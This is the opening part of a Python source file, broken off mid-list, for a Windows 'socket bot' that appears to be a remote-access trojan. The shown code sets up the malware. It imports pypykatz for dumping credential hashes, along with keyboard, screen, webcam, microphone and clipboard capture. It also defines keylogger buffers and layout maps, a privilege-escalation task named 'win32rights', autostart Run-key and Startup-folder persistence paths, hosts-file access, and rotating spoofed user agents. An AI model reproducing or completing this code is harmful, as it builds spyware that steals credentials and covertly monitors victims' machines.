# CREATOR 
# GitHub https://github.com/cppandpython
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 17

# DATE: 24.02.2026
# APP: BOT
# TYPE: SOCKET_BOT
# VERSION: LATEST
# PLATFORM: win32
from sys import argv, platform as sys_platform, executable as py_path
if sys_platform != 'win32': raise SystemError(f'DO NOT SUPPORT ({sys_platform})')
import os
__file__ = os.path.abspath(argv[0])
IS_EXE = __file__.endswith('.exe')
SYSTEMDISK = os.getenv('SYSTEMDRIVE', 'C:')
if not SYSTEMDISK.endswith(os.sep): SYSTEMDISK += os.sep
#
#-
#--
#---
#----
#-----
#------
#-------------------------|NECESSARILY|-------------------------#
PORT = 2022 # RESPONSIBLE FOR SERVER PORT
SEED = 0 # RESPONSIBLE FOR ENCRYPTION INITIAL VALUES 
PATH = '' # PATH TO SAVE SOCKET BOT
#-----------------------------|END|-----------------------------#



#-------------------------|OPTIONAL|-------------------------#
BOT_FILE_NAME = os.path.split(__file__)[-1] # HOW TO SAVE SOCKET BOT NAME IN PATH 
BOT_TASK_NAME = '' # TASK NAME IN SCHEDULE FOR SOCKET BOT & NECESSARY IF BOT_EXE IS TRUE
BOT_TASK_DESCRIPTION = '' # TASK DESCRIPTION IN SCHEDULE FOR SOCKET BOT & NECESSARY IF BOT_EXE IS TRUE
BOT_EXE = False # SOCKET BOT WILL BE LAUNCHED IN (EXE IF BOT_EXE == True ELSE PYTHON) MODE
#----------------------------|END|---------------------------#
#------
#-----
#----
#---
#--
#-
#




NULL = 'N/A'
FILE_ENCODING = 'UTF-8'

_x00 = b'\x00\x00\x00\x00'
TIMEOUT = 120




import shutil
import winreg
import platform
from ctypes import windll
from getpass import getuser
from threading import Thread
from io import BytesIO, StringIO
from csv import DictReader as csv
from wave import open as open_wave
from re import compile as re_exp, DOTALL
from random import seed, randint, choice
from datetime import datetime, timedelta
from codecs import getincrementaldecoder
from webbrowser import open as open_site
from zlib import compressobj, decompressobj
from locale import getencoding, windows_locale
from subprocess import run as sp_run, PIPE, DEVNULL
from time import sleep, time, ctime, mktime, timezone
from socket import (
    gethostbyname as verify_domain, 
    socket, 
    AF_INET, 
    AF_INET6, 
    SOCK_STREAM, 
    SOCK_DGRAM, 
    SOL_SOCKET, 
    SO_REUSEADDR
)


import win32con
import win32netcon
import win32api
import win32process
import win32serviceutil
import win32clipboard
import win32gui
import win32net
import win32security
import win32evtlog
import psutil
import mouse
import keyboard as kb
import sounddevice as sd
import cv2 as opencv
from pythoncom import CoInitialize, CoUninitialize
from win32com.client import Dispatch
try:
    from pypykatz.registry.offline_parser import OfflineRegistry as hashpass
except ImportError:
    from pypykatz.registry.offline_parser import OffineRegistry as hashpass
from requests import get as http_get
from pywifi import PyWiFi, const as wifi_const
from mss.tools import to_png
from mss import mss
from playsound import playsound
from winotify import Notification
from tabulate import tabulate
from chardet import detect




from warnings import filterwarnings as _diswarnings
from logging import disable as _dislogging
_diswarnings('ignore')
_dislogging(50)




def invalid_type(name, value, valid):
    if not isinstance(value, valid):
        raise TypeError(f'({name}) must be ({valid.__name__})')


invalid_type('BOT_EXE', BOT_EXE, bool)
invalid_type('BOT_FILE_NAME', BOT_FILE_NAME, str)

if not BOT_FILE_NAME:
    raise ValueError('(BOT_FILE_NAME) is empty')

BOT_FILE_PATH = os.path.join(PATH, BOT_FILE_NAME)
BOT_FILE_PATH_RECOVERY = os.path.join(os.getenv('TEMP', os.path.join(SYSTEMDISK, 'Windows', 'Temp')), '0x5b2fd1329aa49643')

PATH_MEM = os.path.join(PATH, 'mem')
PATH_SYS = os.path.join(PATH, 'sys')
PATH_CONFIG = os.path.join(PATH_SYS, 'config')
PATH_TMP = os.path.join(PATH, 'tmp')
PATH_SHARE = os.path.join(PATH, 'share')

CONFIG_SEED = os.path.join(PATH_CONFIG, '0x6e17263f779dce5a')

GETSYSTEM_TASK_NAME = 'win32rights'

PID = os.getpid() 
MACHINE = platform.machine()
ARCHITECTURE = platform.architecture()[0]
PROCESSOR = platform.processor()
OS = {
    'platform': platform.system(), 
    'release': platform.release(), 
    'edition': platform.win32_edition(),
    'version': platform.version()
}
NODE = platform.node()
USER = getuser()
LANG = windows_locale.get(win32api.GetUserDefaultLangID(), NULL)
ENCODING = getencoding()

FILE_BOT_RESTART = os.path.join(PATH_SYS, '0x3b8f1289273df19c')
FILE_AUTOSTART = os.path.join(PATH_SYS, '0x79f2d2686b6da01e')
FILE_APP_BLOCKER = os.path.join(PATH_TMP, '0x1f95051e7493c896')
FILE_KEYLOGGER_FLAG = os.path.join(PATH_SYS, '0x2a47be6d04a14df5')
FILE_KEYLOGGER = os.path.join(PATH_TMP, '0x4b0944084a778666')
FILE_DXDIAG = os.path.join(PATH_TMP, '0x3c93cc8a140e3331.txt')
FILE_HOSTS = os.path.join(SYSTEMDISK, 'Windows', 'System32', 'drivers', 'etc', 'hosts')

EVENTLOG_CATEGORY = {
    0: 'Unknown Event Category',     
    1: 'Network Events',             
    2: 'Access and Authentication',  
    3: 'Application Errors',           
    4: 'System Information',           
    5: 'System Failures',             
    6: 'Updates and Installations',  
    7: 'Security Events',              
    8: 'System Services',             
    9: 'Network Connections'           
}
EVENTLOG_TYPE = {
    0: 'Unknown Event Type',      
    1: 'Error',                       
    2: 'Warning',                     
    4: 'Information',            
    8: 'Success Audit',               
    16: 'Failure Audit'                
}

REG_ROOT_KEY = {
    'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
    'HKEY_LOCAL_MACHINE': winreg.HKEY_LOCAL_MACHINE,
    'HKEY_CURRENT_USER': winreg.HKEY_CURRENT_USER,
    'HKEY_CURRENT_CONFIG': winreg.HKEY_CURRENT_CONFIG,
    'HKEY_USERS': winreg.HKEY_USERS,
    'HKEY_DYN_DATA': winreg.HKEY_DYN_DATA,
    'HKEY_PERFORMANCE_DATA': winreg.HKEY_PERFORMANCE_DATA
}
REG_TYPE = {
    winreg.REG_NONE: 'NONE',
    winreg.REG_SZ: 'SZ',
    winreg.REG_EXPAND_SZ: 'EXPAND_SZ',
    winreg.REG_BINARY: 'BINARY',
    winreg.REG_DWORD: 'DWORD',
    winreg.REG_DWORD_BIG_ENDIAN: 'DWORD_BIG_ENDIAN',
    winreg.REG_QWORD: 'QWORD',
    winreg.REG_LINK: 'LINK',
    winreg.REG_MULTI_SZ: 'MULTI_SZ',
    winreg.REG_RESOURCE_LIST: 'RESOURCE_LIST',
    winreg.REG_FULL_RESOURCE_DESCRIPTOR: 'FULL_RESOURCE_DESCRIPTOR',
    winreg.REG_RESOURCE_REQUIREMENTS_LIST: 'RESOURCE_REQUIREMENTS_LIST'
}

REG_KEY_HARDWARE = os.path.join('HKEY_LOCAL_MACHINE', 'HARDWARE', 'DESCRIPTION', 'System')
REG_KEY_WINDOWS_NT = os.path.join('HKEY_LOCAL_MACHINE', 'SOFTWARE', 'Microsoft', 'Windows NT', 'CurrentVersion')
REG_KEY_MACHINE_CURRENTCONTROLSET = os.path.join('HKEY_LOCAL_MACHINE', 'SYSTEM', 'CurrentControlSet')
REG_KEY_MACHINE_CURRENTVERSION = os.path.join('HKEY_LOCAL_MACHINE', 'SOFTWARE', 'Microsoft', 'Windows', 'CurrentVersion')
REG_KEY_USER_CURRENTVERSION = os.path.join('HKEY_CURRENT_USER', 'Software', 'Microsoft', 'Windows', 'CurrentVersion')
REG_KEY_DEVICE = os.path.join(REG_KEY_MACHINE_CURRENTCONTROLSET, 'Enum')
REG_KEY_BIOS = os.path.join(REG_KEY_HARDWARE, 'BIOS')
REG_KEY_CPU = os.path.join(REG_KEY_HARDWARE, 'CentralProcessor')
REG_KEY_MACHINE_POLICIES = os.path.join('HKEY_LOCAL_MACHINE', 'SOFTWARE', 'Policies')
REG_KEY_USER_POLICIES = os.path.join('HKEY_CURRENT_USER', 'SOFTWARE', 'Policies')
REG_KEY_SCHEDULE = os.path.join(REG_KEY_MACHINE_CURRENTCONTROLSET, 'Services', 'Schedule')
REG_KEY_STARTUP_MACHINE = os.path.join(REG_KEY_MACHINE_CURRENTVERSION, 'Run')
PATH_STARTUP_MACHINE = os.path.join(SYSTEMDISK, 'ProgramData', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
REG_KEY_STARTUP_USER = os.path.join(REG_KEY_USER_CURRENTVERSION, 'Run')
PATH_STARTUP_USER = os.path.join(SYSTEMDISK, 'Users', USER, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
REG_KEY_STARTUP_MACHINE_STATUS = os.path.join(REG_KEY_MACHINE_CURRENTVERSION, 'Explorer', 'StartupApproved', 'Run')
PATH_STARTUP_MACHINE_STATUS = os.path.join(REG_KEY_MACHINE_CURRENTVERSION, 'Explorer', 'StartupApproved', 'StartupFolder')
REG_KEY_STARTUP_USER_STATUS = os.path.join(REG_KEY_USER_CURRENTVERSION, 'Explorer', 'StartupApproved', 'Run')
PATH_STARTUP_USER_STATUS = os.path.join(REG_KEY_USER_CURRENTVERSION, 'Explorer', 'StartupApproved', 'StartupFolder')
REG_KEY_APP = os.path.join(REG_KEY_MACHINE_CURRENTVERSION, 'Uninstall')
REG_KEY_APP_6432 = os.path.join('HKEY_LOCAL_MACHINE', 'SOFTWARE', 'WOW6432Node', 'Microsoft', 'Windows', 'CurrentVersion', 'Uninstall')
REG_KEY_ENV_MACHINE = os.path.join(REG_KEY_MACHINE_CURRENTCONTROLSET, 'Control', 'Session Manager', 'Environment')
REG_KEY_ENV_USER = os.path.join('HKEY_CURRENT_USER', 'Environment')
REG_KEY_TMP_ENV_USER = os.path.join('HKEY_CURRENT_USER', 'Volatile Environment')
REG_KEY_CONTROL_PANEL = os.path.join('HKEY_CURRENT_USER', 'Control Panel')
REG_KEY_DESKTOP = os.path.join(REG_KEY_CONTROL_PANEL, 'Desktop')
REG_KEY_MOUSE = os.path.join(REG_KEY_CONTROL_PANEL, 'Mouse')
REG_KEY_CURSOR = os.path.join(REG_KEY_CONTROL_PANEL, 'Cursors')
REG_KEY_KEYBOARD = os.path.join(REG_KEY_CONTROL_PANEL, 'Keyboard')

REG_VALUE_STARTUP_ENABLED = b'\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
REG_VALUE_STARTUP_DISABLED = b'\x03\x00\x00\x00\x06\xf3\xf4\xf4VN\xdc\x01'

DEVICE_CHANGES = {
    'bios_vendor': (REG_KEY_BIOS, 'BIOSVendor'),
    'bios_version': (REG_KEY_BIOS, 'BIOSVersion'),
    'bios_date': (REG_KEY_BIOS, 'BIOSReleaseDate'),
    'baseboard': (REG_KEY_BIOS, 'BaseBoardProduct'),
    'baseboard_vendor': (REG_KEY_BIOS, 'BaseBoardManufacturer'),
    'baseboard_version': (REG_KEY_BIOS, 'BaseBoardVersion'),
    'cpu': (REG_KEY_CPU, 'ProcessorNameString'),
    'cpu_id': (REG_KEY_CPU, 'Identifier'),
    'cpu_mhz': (REG_KEY_CPU, '~MHz'),
    'cpu_vendor': (REG_KEY_CPU, 'VendorIdentifier'),
    'os': (REG_KEY_WINDOWS_NT, 'ProductName'),
    'os_edition': (REG_KEY_WINDOWS_NT, ['EditionID', 'CompositionEditionID']),
    'os_version': (REG_KEY_WINDOWS_NT, ['CurrentVersion', 'DisplayVersion']),
    'os_build': (REG_KEY_WINDOWS_NT, ['CurrentBuild', 'CurrentBuildNumber']),
    'os_product': (REG_KEY_WINDOWS_NT, 'ProductId'),
    'os_owner': (REG_KEY_WINDOWS_NT, 'RegisteredOwner'),
    'os_date': (REG_KEY_WINDOWS_NT, 'InstallDate'),
    'node': (os.path.join(REG_KEY_MACHINE_CURRENTCONTROLSET, 'Control', 'ComputerName', 'ComputerName'), 'ComputerName'),
    'device_name': (REG_KEY_DEVICE, 'FriendlyName'),
    'device_desc': (REG_KEY_DEVICE, 'DeviceDesc')
}

KEYBOARD_LAYOUT = {'00140C00': 'ad', '0000041C': 'al', '0000042B': 'am', '0002042B': 'am', '0003042B': 'am', '0001042B': 'am', '0000044D': 'as', '0000046D': 'ba', '00030402': 'bg', '00010402': 'bg', '00040402': 'bg', '00020402': 'bg', '00000402': 'bg', '00000445': 'bn', '00020445': 'bn', '00010445': 'bn', '0001080C': 'be', '00000813': 'be', '0000080C': 'be', '0000201A': 'bs', '000B0C00': 'bu', '0000040A': 'es', '0001040A': 'es', '00001009': 'ca', '00000C0C': 'ca', '00011009': 'ca', '00000492': 'ck', '0000045C': 'ch', '0001045C': 'ch', '00060409': 'co', '00000406': 'dk', '00000439': 'de', '00010407': 'de', '00020407': 'de', '00030407': 'de', '00000437': 'ge', '00020437': 'ge', '00030437': 'ge', '00040437': 'ge', '00010437': 'ge', '0000046F': 'gl', '00000438': 'fo', '0000040B': 'fi', '0001083B': 'fi', '0000040C': 'fr', '0001040C': 'fr', '0002040C': 'fr', '00120C00': 'ft', '000C0C00': 'gt', '00000408': 'gr', '00010408': 'gr', '00020408': 'gr', '00030408': 'gr', '00040408': 'gr', '00050408': 'gr', '00060408': 'gr', '00000474': 'gn', '00000447': 'gu', '00000468': 'ha', '0000040D': 'he', '0002040D': 'he', '0003040D': 'he', '00010439': 'hi', '0000040E': 'hu', '0001040E': 'hu', '00001809': 'ga', '00000470': 'ig', '0000085D': 'in', '0001045D': 'in', '0002045D': 'in', '0000040F': 'is', '00000410': 'it', '00010410': 'it', '00000411': 'jp', '00110C00': 'jv', '00000453': 'km', '00010453': 'km', '0000044B': 'kn', '00000412': 'kr', '0000043F': 'kz', '00000454': 'la', '0000080A': 'la', '00070C00': 'li', '00080C00': 'li', '00010427': 'lt', '00000427': 'lt', '00020427': 'lt', '0000046E': 'lu', '0000042F': 'mk', '0001042F': 'mk', '0000044C': 'ml', '0000043A': 'mt', '0001043A': 'mt', '00020850': 'mt', '00000481': 'mi', '0000044E': 'mr', '00000450': 'mn', '00000850': 'mn', '00010C00': 'mm', '00130C00': 'mm', '00000461': 'ne', '00000414': 'no', '0000043B': 'no', '00020C00': 'nt', '00090C00': 'nk', '00001409': 'nz', '00000448': 'od', '00040C00': 'og', '000D0C00': 'ol', '000F0C00': 'oi', '00150C00': 'os', '000E0C00': 'om', '00000415': 'pl', '00010415': 'pl', '00000416': 'pt', '00000816': 'pt', '00010416': 'pt', '00000463': 'ps', '00000446': 'pa', '00000418': 'ro', '00010418': 'ro', '00020418': 'ro', '00000419': 'ru', '00010419': 'ru', '00020419': 'ru', '00000485': 'sa', '0002083B': 'sa', '0001043B': 'sa', '00011809': 'sg', '00000C1A': 'sr', '0001042E': 'sr', '0002042E': 'sr', '0000081A': 'sr', '0000042E': 'sr', '00000432': 'st', '0000041A': 'st', '0000045B': 'si', '0001045B': 'si', '0000041B': 'sk', '0001041B': 'sk', '00000424': 'sl', '00100C00': 'so', '0000041D': 'sv', '0000083B': 'sv', '0000100C': 'sw', '00000807': 'sw', '0000045A': 'sy', '0001045A': 'sy', '00030C00': 'ta', '00000428': 'tj', '00000449': 'ta', '00020449': 'ta', '00030449': 'ta', '0000044A': 'te', '00010444': 'tt', '00000444': 'tt', '0000105F': 'tf', '0001105F': 'tf', '00000451': 'ti', '00010451': 'ti', '0000041E': 'th', '0002041E': 'th', '0001041E': 'th', '0003041E': 'th', '0000041F': 'tr', '0001041F': 'tr', '00000442': 'tm', '00000422': 'ua', '00020422': 'ua', '00000452': 'ua', '00000480': 'ug', '00010480': 'ug', '00000409': 'en', '00000809': 'en', '00030409': 'en', '00040409': 'en', '00020409': 'en', '00050409': 'en', '00000425': 'et', '00000843': 'uz', '0000042A': 'vi', '00000488': 'wo', '0000046A': 'yo'}
KEYBOARD_HOTKEY = {'backspace': '[BACKSPACE]', 'enter': '[ENTER]', 'space': '[SPACE]', 'ctrl': '[CTRL]', 'left ctrl': '[LEFT CTRL]', 'right ctrl': '[RIGHT CTRL]', 'shift': '[SHIFT]', 'left shift': '[LEFT SHIFT]', 'right shift': '[RIGHT SHIFT]', 'alt': '[ALT]', 'left alt': '[LEFT ALT]', 'right alt': '[RIGHT ALT]', 'tab': '[TAB]', 'caps lock': '[CAPS LOCK]', 'up': '[UP]', 'down': '[DOWN]', 'left': '[LEFT]', 'right': '[RIGHT]', 'insert': '[INSERT]', 'home': '[HOME]', 'page up': '[PAGE UP]', 'page down': '[PAGE DOWN]', 'delete': '[DELETE]', 'decimal': '[DECIMAL]', 'end': '[END]', 'print screen': '[PRINT SCREEN]', 'scroll lock': '[SCROLL LOCK]', 'pause': '[PAUSE]', 'num lock': '[NUM LOCK]', 'clear': '[CLEAR]', 'esc': '[ESC]', 'f1': '[F1]', 'f2': '[F2]', 'f3': '[F3]', 'f4': '[F4]', 'f5': '[F5]', 'f6': '[F6]', 'f7': '[F7]', 'f8': '[F8]', 'f9': '[F9]', 'f10': '[F10]', 'f11': '[F11]', 'f12': '[F12]', 'windows': '[WINDOWS]', 'left windows': '[LEFT WINDOWS]', 'right windows': '[RIGHT WINDOWS]', 'num 0': '[NUM 0]', 'num 1': '[NUM 1]', 'num 2': '[NUM 2]', 'num 3': '[NUM 3]', 'num 4': '[NUM 4]', 'num 5': '[NUM 5]', 'num 6': '[NUM 6]', 'num 7': '[NUM 7]', 'num 8': '[NUM 8]', 'num 9': '[NUM 9]', 'num enter': '[NUM ENTER]', 'num +': '[NUM +]', 'num -': '[NUM -]', 'num *': '[NUM *]', 'num /': '[NUM /]', 'media play/pause': '[MEDIA PLAY/PAUSE]', 'media stop': '[MEDIA STOP]', 'media next': '[MEDIA NEXT]', 'media prev': '[MEDIA PREV]', 'volume up': '[VOLUME UP]', 'volume down': '[VOLUME DOWN]', 'mute': '[MUTE]'}
KEYBOARD_SPECIAL = {'[ENTER]': '\n', '[SPACE]': ' ', '[TAB]': '\t'}

EN = {'16': 'q', '17': 'w', '18': 'e', '19': 'r', '20': 't', '21': 'y', '22': 'u', '23': 'i', '24': 'o', '25': 'p', '30': 'a', '31': 's', '32': 'd', '33': 'f', '34': 'g', '35': 'h', '36': 'j', '37': 'k', '38': 'l', '44': 'z', '45': 'x', '46': 'c', '47': 'v', '48': 'b', '49': 'n', '50': 'm'}
RU = {'16': 'й', '17': 'ц', '18': 'у', '19': 'к', '20': 'е', '21': 'н', '22': 'г', '23': 'ш', '24': 'щ', '25': 'з', '26': 'х', '27': 'ъ', '30': 'ф', '31': 'ы', '32': 'в', '33': 'а', '34': 'п', '35': 'р', '36': 'о', '37': 'л', '38': 'д', '39': 'ж', '40': 'э', '41': 'ё', '44': 'я', '45': 'ч', '46': 'с', '47': 'м', '48': 'и', '49': 'т', '50': 'ь', '51': 'б', '52': 'ю'}
RU_SPECIAL = {'`': 'ё', '~': 'Ё', '!': '!', '@': '"', '#': '№', '$': ';', '%': '%', '^': ':', '&': '?', '*': '*', '(': '(', ')': ')', '-': '-', '_': '_', '=': '=', '+': '+', '[': 'х', '{': 'Х', ']': 'ъ', '}': 'Ъ', '\\': '\\', '|': '/', ';': 'ж', ':': 'Ж', "'": 'э', '"': 'Э', ',': 'б', '<': 'Б', '.': 'ю', '>': 'Ю', '/': '.', '?': ','}
UA = {'16': 'й', '17': 'ц', '18': 'у', '19': 'к', '20': 'е', '21': 'н', '22': 'г', '23': 'ш', '24': 'щ', '25': 'з', '26': 'х', '27': 'ї', '30': 'ф', '31': 'і', '32': 'в', '33': 'а', '34': 'п', '35': 'р', '36': 'о', '37': 'л', '38': 'д', '39': 'ж', '40': 'э', '41': 'ё', '44': 'я', '45': 'ч', '46': 'с', '47': 'м', '48': 'и', '49': 'т', '50': 'ь', '51': 'б', '52': 'ю', '42': 'є'}

KEYLOGGER_BUFFER_SIZE = 30

HTTP_HEADER = choice([{'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:50.0.1) Gecko/20100101 Firefox/50.0.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.7.4) Gecko/20100101 Firefox/52.7.4'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:58.0.2) Gecko/20100101 Firefox/58.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36 OPR/55.0.2994.61'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0.2) Gecko/20100101 Firefox/56.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; rv:57.0.3) Gecko/20100101 Firefox/57.0.3'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2; rv:52.8.1) Gecko/20100101 Firefox/52.8.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6; rv:60.2.2) Gecko/20100101 Firefox/60.2.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36 OPR/54.0.2952.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36 OPR/52.0.2871.99'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Safari/537.36 OPR/50.0.2762.67'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 OPR/55.0.2994.37'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626 Safari/537.36 OPR/56.0.3051.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36 OPR/55.0.2994.47'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:66.0.3) Gecko/20100101 Firefox/66.0.3'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1; rv:52.5.2) Gecko/20100101 Firefox/52.5.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0.2) Gecko/20100101 Firefox/59.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:52.1.1) Gecko/20100101 Firefox/52.1.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6; rv:59.0.2) Gecko/20100101 Firefox/59.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:58.0.2) Gecko/20100101 Firefox/58.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:57.0.2) Gecko/20100101 Firefox/57.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2; rv:52.1.0) Gecko/20100101 Firefox/52.1.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1; rv:66.0.5) Gecko/20100101 Firefox/66.0.5'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6; rv:62.0.2) Gecko/20100101 Firefox/62.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.3.0) Gecko/20100101 Firefox/60.3.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/52.0.2871.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:59.0.2) Gecko/20100101 Firefox/59.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809 Safari/537.36 OPR/58.0.3135.107'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36 OPR/54.0.2952.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0.1) Gecko/20100101 Firefox/51.0.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1; rv:52.8.1) Gecko/20100101 Firefox/52.8.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:50.0.2) Gecko/20100101 Firefox/50.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0 Safari/537.36 OPR/58.0.3135.127'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:65.0.1) Gecko/20100101 Firefox/65.0.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/52.0.2871.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.5.2) Gecko/20100101 Firefox/60.5.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 